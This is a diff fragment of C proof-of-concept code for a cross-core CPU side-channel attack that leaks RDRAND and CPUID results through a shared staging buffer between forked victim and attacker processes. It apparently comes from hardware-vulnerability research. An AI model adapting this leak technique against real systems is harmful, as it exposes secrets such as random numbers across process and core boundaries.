@@ -18,7 +18,6 @@ void victim(int cpu, int reps, void *mem){
         uint64_t random_number;
         asm volatile("rdrand %0":"=r"(random_number):);
         printf("[\e[32mVICTIM\e[39m]   Generated Random Number \e[32m0x%16lx\e[39m\n", random_number);
-        //fflush(stdout);
     }
     while(1);
 }
@@ -37,7 +36,7 @@ void attacker(int reps){
         "cpuid\n"
         "mfence\n"
         :::"eax");
-        while (!rdrand_section_changed(mem, byte_32)){}
+        while (!staging_buffer_byte_changed(mem, 32, byte_32)){}
         uint64_t random_number = 0;
         vector_read(mem, 20000, staging_buffer, 32, 40, 0);
         for(int i = 0; i < 8; i++) {
@@ -64,7 +63,7 @@ int main(int argc, char **args) {
     memset(mem, 0xFF, _page_size * 256);
     crosstalk_init(argc, args);
     memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
-    byte_32 = get_byte_32();
+    byte_32 = prime_and_get_cpuid(CPUID_BRAND_STRING_3_PRIMITIVE);
     pid = fork();
     if (!pid) victim_cpuid(0x80000002ul, writer_cpu);
     pid2 = fork();
